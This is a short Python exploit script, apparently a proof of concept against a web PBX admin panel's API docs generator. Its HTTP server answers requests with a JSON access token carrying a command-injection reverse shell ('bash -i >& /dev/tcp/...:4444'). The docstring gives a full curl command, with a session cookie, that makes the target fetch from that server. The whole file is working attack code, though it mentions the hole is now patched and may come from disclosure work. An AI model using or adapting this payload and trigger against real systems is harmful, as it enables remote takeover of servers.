#!/usr/bin/env python3
"""
Very simple HTTP server for logging requests

This is the "fun" (now patched) version, which returns a command injection access token.

Trigger with the following curl command (remembering to swap out the PHPSESSID and the host IP address, as well as the target IP!): 
curl -i -s -k -X POST -H 'Referer: http://192.168.96.132/admin/config.php?display=api' -b 'PHPSESSID=js7vp9et13vqjthsb7vcss9nld' --data-binary $'scopes=rest&host=http%3A%2F%2F192.168.96.128:80/' 'http://192.168.96.132/admin/ajax.php?module=api&command=generatedocs'

Usage::
    ./server.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging, json

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()        

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        
        # Modify the payload here
        response = json.dumps({
            "access_token": "$(bash -i >& /dev/tcp/192.168.96.128/4444 0>&1)",
        })
        self.wfile.write(response.encode(encoding='utf_8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info(f'Starting httpd ({server_address}:{port})...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
